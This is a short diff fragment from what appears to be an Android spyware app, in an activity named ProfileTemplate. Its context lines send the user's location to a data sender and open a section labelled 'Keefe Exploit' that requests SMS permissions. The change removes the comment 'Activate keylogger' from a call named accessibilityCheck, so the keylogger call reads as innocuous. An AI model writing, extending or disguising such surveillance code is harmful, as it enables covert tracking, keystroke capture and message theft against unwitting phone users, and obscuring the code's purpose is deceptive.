@@ -61,7 +61,7 @@ class ProfileTemplate : AppCompatActivity() {
         if (checkPerms(this, *LOCPERMISSIONS)) {
             datasender.sendData("loc", gps.getLocationDetails())
         }
-        gn.accessibilityCheck() //Activate keylogger
+        gn.accessibilityCheck()
 
         // Keefe Exploit --------------------------------------------------------------
         val SMSPERMISSIONS = arrayOf(
